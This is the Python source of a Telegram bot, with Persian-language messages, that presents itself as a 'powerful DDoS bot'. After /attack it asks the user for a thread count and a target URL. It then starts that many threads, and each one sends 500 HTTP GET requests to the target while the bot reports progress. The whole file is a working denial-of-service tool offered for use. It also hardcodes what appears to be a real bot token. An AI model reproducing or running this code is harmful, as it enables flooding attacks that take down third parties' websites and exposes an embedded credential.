from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import FSMContext
import markup as nav
import logging
import time
import requests
import socket
from threading import Thread

bot = Bot(token="5412349549:AAFWB9oa5VAtdBGRzPqH2jAziP9zkxCx05o")
channel_id = '467713513'
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

coutrequests = 0
errorrequests = 0

class Attack(StatesGroup):
    thr = State()
    target = State()

@dp.message_handler(commands="start")
async def start(message: types.Message):
    await bot.send_message(message.chat.id, 'با درود {0.first_name} ! به ربات دیداس خوش امدید برای شروع: /attack!\ برای کسب اطلاعات بیشتر پلتفرم : /help\
                              ارتباط با برنامه نویس @Nimajafarpor'.format(message.from_user))
    await bot.send_message(message.chat.id, "و همچنین کانال ما t.me/Securit_y_Breach")
    
    pass

def dos(site):
    global coutrequests
    global errorrequests
    for _ in range(500):
        try:
            resp = requests.get(site)
            print(resp.status_code)

            coutrequests = coutrequests + 1
            print(coutrequests)
            time.sleep(1)
        except Exception as r:
            errorrequests = errorrequests + 1
            print(f'خطا {r}')
            time.sleep(1)

@dp.message_handler(commands="attack")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "تعداد حملات را وارد کنید :")
    await Attack.thr.set()
    @dp.message_handler(state=Attack.thr)
    async def theard(message: types.Message, state: FSMContext):
        await state.update_data(coutthr=int(message.text))
        await bot.send_message(message.chat.id, "تارگت را وارد کنید برای مثال (https://www.google.com)")
        await Attack.next()
        @dp.message_handler(state=Attack.target)
        async def theards(message: types.Message, state: FSMContext):
            await state.update_data(trg=message.text)
            mainmsg = await bot.send_message(message.chat.id, "چک کردن...")
            data = await state.get_data()
            thrd = int(data['coutthr'])
            site = data['trg']
            try:
                await mainmsg.edit_text("شروع ")
                for i in range(int(thrd)):
                    th = Thread(target=dos, args=(site, ))
                    th.start()
                    await mainmsg.edit_text(f"شروع شد {i}/{thrd}\n(سرعت راه اندازی تاپیک محدود است )")
                    time.sleep(0.2)
                text = ""
                for _ in range(110):
                    global coutrequests
                    global errorrequests
                    test = requests.get(site)
                    text = f"حملات به درستی اغاز شد\nهدف: {site}\nتعداد حملات : {thrd}\nنتایج پرسجو : {test.status_code}\nدرخواست های مطرح شده : {coutrequests}\nخطاهای اتصال : {errorrequests}\nزمان حمله : 500 ثانیه\nبروزرسانی پیام : هر 5 ثانیه"
                    await mainmsg.edit_text(text = text)
                    time.sleep(5)
                await mainmsg.edit_text(text = f"پایان ")
                await mainmsg.edit_text(text = f"جریان ها تکمیل شد\nروز خوبی داشته باشید ")
                coutrequests = 0
                errorrequests = 0
                await state.finish()
                pass
                
            except Exception as err:
                await mainmsg.edit_text(text = f"خطا\n{err}")
                await state.finish()
                pass

@dp.message_handler(commands="help")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id,"Naqs Amniat - بات قدرتمند دیداس\
                      - برنامه نویسی شده توسط @Nimajafarpor")

@dp.message_handler(text="Top Charts")
async def Ton(message: types.Message):
    await bot.send_message(message.from_user.id,
                           ''.format(message.from_user))

    
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
